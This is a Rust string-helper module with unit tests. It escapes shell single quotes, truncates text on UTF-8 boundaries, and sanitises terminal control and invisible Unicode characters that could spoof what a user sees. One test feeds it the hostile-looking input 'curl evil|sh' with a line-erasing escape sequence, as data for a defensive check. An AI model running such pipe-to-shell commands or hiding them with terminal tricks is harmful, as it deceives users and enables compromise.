//! Small string helpers shared across modules.

/// Escape a value for inclusion in a POSIX single-quoted string.
///
/// Closes the quote, emits an escaped literal quote, and reopens — the only way
/// to represent `'` inside `'...'`, since a single-quoted shell string has no
/// escape character of its own.
///
/// Two callers, and they had a copy each: the terminal backends quoting env
/// values and worktree paths they type into a live shell, and the agent
/// registry quoting a prompt into an argv. Both handle text foundry did not
/// write — a GitHub issue body reaches the second one — so they must not drift.
pub fn escape_single_quoted(value: &str) -> String {
    value.replace('\'', "'\\''")
}

/// Truncate `s` to at most `max_bytes`, cutting on a character boundary.
///
/// Rust's `&s[..n]` panics when `n` lands inside a multi-byte character, so any
/// byte-oriented length cap applied to text that can hold non-ASCII needs this.
/// Two places do: workspace names, which `--issue` derives from GitHub issue
/// titles (remote input, frequently not Latin script), and the Zellij session
/// name built from the worktree directory. Both previously sliced by byte index
/// and aborted the command on a title like "日本語のタイトル".
///
/// Returns a prefix that is never longer than `max_bytes`, so a limit smaller
/// than the first character yields an empty string rather than an error.
pub fn truncate_on_char_boundary(s: &str, max_bytes: usize) -> &str {
    if s.len() <= max_bytes {
        return s;
    }
    // 0 is always a boundary, so this cannot fail to find one.
    let end = (0..=max_bytes)
        .rev()
        .find(|&i| s.is_char_boundary(i))
        .unwrap_or(0);
    &s[..end]
}

/// True for a character that can move the cursor, repaint, or reorder text
/// rather than draw a glyph.
///
/// `is_control` covers C0, DEL and C1. The rest are the format and separator
/// characters a terminal or a bidirectional layout engine acts on, none of
/// which draw anything — so escaping them cannot make legitimate text less
/// readable. The list is an enumeration rather than a category test because
/// std has no `Cf` predicate; general category `Cf` is what it approximates.
pub fn is_display_control(c: char) -> bool {
    c.is_control()
        || matches!(c,
            '\u{00AD}'                       // soft hyphen
            | '\u{061C}'                     // arabic letter mark (bidi)
            | '\u{180E}'                     // mongolian vowel separator
            | '\u{200B}'..='\u{200F}'        // zero-width spaces, LRM/RLM
            | '\u{2028}' | '\u{2029}'        // line / paragraph separator
            | '\u{202A}'..='\u{202E}'        // bidi embeddings and overrides
            | '\u{2060}'..='\u{2064}'        // word joiner, invisible operators
            | '\u{2066}'..='\u{2069}'        // bidi isolates
            | '\u{FEFF}'                     // zero-width no-break space
            | '\u{FFF9}'..='\u{FFFB}'        // interlinear annotation
            | '\u{E0000}'..='\u{E007F}'      // tag characters (ASCII smuggling)
        )
}

/// Escape anything in `s` that a terminal would act on instead of draw.
///
/// Use this for text that came from outside — a repository's `.foundry.toml`,
/// say — before printing it anywhere a user reads it to make a decision. A
/// string carrying `ESC [ 2 K` and a carriage return erases the line it was
/// printed on and redraws it, so untrusted text can otherwise replace what the
/// user thinks they are looking at. Ordinary text is returned unchanged: quotes,
/// `$`, `|`, `&&` and non-ASCII scripts all pass through, because this text
/// only helps if it stays readable.
pub fn sanitize_for_display(s: &str) -> String {
    s.chars()
        .flat_map(|c| {
            if is_display_control(c) {
                c.escape_unicode().collect::<Vec<_>>()
            } else {
                vec![c]
            }
        })
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn sanitize_escapes_cursor_control() {
        let out = sanitize_for_display("curl evil|sh\u{1b}[2K\rpnpm install");
        assert!(!out.contains('\u{1b}'), "{out:?}");
        assert!(!out.contains('\r'), "{out:?}");
        assert!(out.contains("curl evil|sh"), "{out:?}");
    }

    /// Invisible reordering and zero-width characters need no C0 byte.
    #[test]
    fn sanitize_escapes_invisible_characters() {
        for c in [
            '\u{061C}',
            '\u{200B}',
            '\u{200F}',
            '\u{202E}',
            '\u{2060}',
            '\u{2066}',
            '\u{feff}',
            '\u{00ad}',
            '\u{180E}',
            '\u{FFF9}',
            '\u{E0041}',
        ] {
            let out = sanitize_for_display(&format!("a{c}b"));
            assert!(!out.contains(c), "{c:?} survived: {out:?}");
        }
    }

    /// Over-escaping is its own failure — this text exists to be read.
    #[test]
    fn sanitize_leaves_ordinary_text_alone() {
        for s in [
            "pnpm install && pnpm build",
            "sed -i '' 's/PORT=3000/PORT=$VITE_PORT/' .env",
            "echo \"café 日本語 — ok\" > notes.txt",
            "worktree_dir",
            "C:\\Users\\me\\wt",
        ] {
            assert_eq!(sanitize_for_display(s), s, "mangled: {s}");
        }
    }

    #[test]
    fn returns_input_when_under_the_limit() {
        assert_eq!(truncate_on_char_boundary("abc", 10), "abc");
        assert_eq!(truncate_on_char_boundary("abc", 3), "abc");
        assert_eq!(truncate_on_char_boundary("", 0), "");
    }

    #[test]
    fn cuts_ascii_at_the_exact_limit() {
        assert_eq!(truncate_on_char_boundary("abcdef", 3), "abc");
    }

    /// The case that used to panic: the limit lands inside a character.
    #[test]
    fn backs_off_to_a_boundary_inside_a_multibyte_char() {
        // Each "日" is 3 bytes, so byte 16 is inside the sixth one.
        let s = "日".repeat(10);
        let out = truncate_on_char_boundary(&s, 16);
        assert_eq!(out.len(), 15);
        assert_eq!(out.chars().count(), 5);
    }

    /// A limit shorter than the first character yields empty, not a panic.
    #[test]
    fn yields_empty_when_the_limit_precedes_the_first_char() {
        assert_eq!(truncate_on_char_boundary("日本語", 1), "");
        assert_eq!(truncate_on_char_boundary("日本語", 2), "");
        assert_eq!(truncate_on_char_boundary("日本語", 3), "日");
    }

    /// Never exceeds the cap, at any limit, for mixed-width input.
    #[test]
    fn never_exceeds_the_cap() {
        let s = "café-日本語-naïve-ünïcödé";
        for limit in 0..s.len() + 5 {
            assert!(truncate_on_char_boundary(s, limit).len() <= limit.min(s.len()));
        }
    }
}
